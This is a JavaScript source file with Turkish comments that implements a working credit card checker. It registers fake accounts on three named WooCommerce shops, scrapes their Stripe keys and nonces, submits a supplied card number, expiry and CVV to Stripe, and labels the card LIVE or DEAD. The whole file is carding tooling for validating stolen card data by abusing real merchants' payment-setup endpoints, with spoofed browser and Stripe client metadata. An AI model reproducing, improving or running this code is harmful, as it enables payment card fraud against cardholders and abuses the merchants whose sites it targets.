// auth.js - Gerçek Stripe Auth Motoru
// Kullanım: checkCard('516874****|12|26|123')

const AUTH_SITES = [
    'https://pathosceramiche.com',
    'https://josephamichael.com',
    'https://perfectible.net'
];

function randomStr(n = 8) {
    const c = 'abcdefghijklmnopqrstuvwxyz';
    let r = '';
    for (let i = 0; i < n; i++) r += c[Math.floor(Math.random() * c.length)];
    return r;
}

function randomEmail() { return `user${randomStr(8)}@gmail.com`; }

function uuidv4() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function parseCard(input) {
    const cleaned = input.replace(/\s/g, '');
    const parts = cleaned.split('|');
    if (parts.length === 4) {
        return { pan: parts[0], exp_m: parts[1].padStart(2, '0'), exp_y: parts[2].slice(-2), cvv: parts[3] };
    }
    const match = input.match(/(\d{15,19})[\s|/:-]+(\d{1,2})[\s|/:-]+(\d{2,4})[\s|/:-]+(\d{3,4})/);
    if (match) {
        return { pan: match[1], exp_m: match[2].padStart(2, '0'), exp_y: match[3].slice(-2), cvv: match[4] };
    }
    return null;
}

async function checkCardOnSite(baseUrl, pan, expM, expY, cvv) {
    const ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36';
    const headers = { 'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9' };

    const addPmUrl = baseUrl + '/my-account/add-payment-method/';
    const email = randomEmail();

    // 1. Register
    const regPayload = new URLSearchParams({
        'email': email,
        'woocommerce-register-nonce': '',
        '_wp_http_referer': '/my-account/add-payment-method/',
        'register': 'Register'
    });

    let html;
    try {
        const r1 = await fetch(addPmUrl, { method: 'POST', headers, body: regPayload });
        html = await r1.text();
    } catch (e) { throw new Error('Site bağlantı hatası'); }

    // Stripe Key
    const keyMatch = html.match(/pk_(?:live|test)_[a-zA-Z0-9]+/);
    if (!keyMatch) throw new Error('Stripe key bulunamadı');
    const stripeKey = keyMatch[0];

    // Setup Intent Nonce
    const nonceMatch = html.match(/"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"/);
    if (!nonceMatch) throw new Error('Setup intent nonce bulunamadı');
    const setupNonce = nonceMatch[1];

    // 2. Stripe Payment Method
    const stripePayload = new URLSearchParams({
        'type': 'card',
        'card[number]': pan,
        'card[cvc]': cvv,
        'card[exp_year]': expY,
        'card[exp_month]': expM,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'TR',
        'payment_user_agent': 'stripe.js/09b245ec49; stripe-js-v3/09b245ec49; payment-element; deferred-intent',
        'referrer': baseUrl,
        'time_on_page': '35000',
        'client_attribution_metadata[client_session_id]': uuidv4(),
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'key': stripeKey,
        '_stripe_version': '2024-06-20'
    });

    const stripeHeaders = {
        'User-Agent': ua,
        'Accept': 'application/json',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/'
    };

    let pmId;
    try {
        const r2 = await fetch('https://api.stripe.com/v1/payment_methods', {
            method: 'POST',
            headers: stripeHeaders,
            body: stripePayload
        });
        const json = await r2.json();
        if (r2.status !== 200) {
            const err = json.error?.message || 'Stripe hatası';
            return { status: 'dead', msg: err };
        }
        pmId = json.id;
        if (!pmId) return { status: 'dead', msg: 'Payment method oluşturulamadı' };
    } catch (e) { return { status: 'dead', msg: 'Stripe bağlantı hatası' }; }

    // 3. WooCommerce Setup Intent Confirm
    const wcParams = new URLSearchParams({ 'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent' });
    const wcPayload = new URLSearchParams({
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pmId,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': setupNonce
    });

    const wcHeaders = {
        'User-Agent': ua,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'x-requested-with': 'XMLHttpRequest',
        'origin': baseUrl,
        'referer': addPmUrl
    };

    try {
        const r3 = await fetch(baseUrl + '?' + wcParams.toString(), {
            method: 'POST',
            headers: wcHeaders,
            body: wcPayload
        });
        const json = await r3.json();
        if (json.success === true) {
            return { status: 'live', msg: '✅ Approved - Stripe Auth Success!' };
        } else {
            const errMsg = json.data?.error?.message || json.data?.message || 'Setup Intent Failed';
            return { status: 'dead', msg: '❌ ' + errMsg };
        }
    } catch (e) {
        return { status: 'dead', msg: '❌ WooCommerce bağlantı hatası' };
    }
}

async function checkCard(cardInput) {
    const parsed = parseCard(cardInput);
    if (!parsed) return '❌ Format hatası: Kart | Ay | Yıl | CVV';

    const { pan, exp_m, exp_y, cvv } = parsed;
    const cleanCard = `${pan}|${exp_m}|${exp_y}|${cvv}`;

    const sites = [...AUTH_SITES];
    for (let i = sites.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [sites[i], sites[j]] = [sites[j], sites[i]];
    }

    for (const site of sites) {
        try {
            const result = await checkCardOnSite(site, pan, exp_m, exp_y, cvv);
            if (result.status === 'live') {
                return `✅ LIVE: ${cleanCard} - ${result.msg}`;
            } else {
                return `❌ DEAD: ${cleanCard} - ${result.msg}`;
            }
        } catch (e) {
            continue;
        }
    }
    return `⚠️ HATA: ${cleanCard} - Tüm siteler başarısız`;
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { checkCard };
}
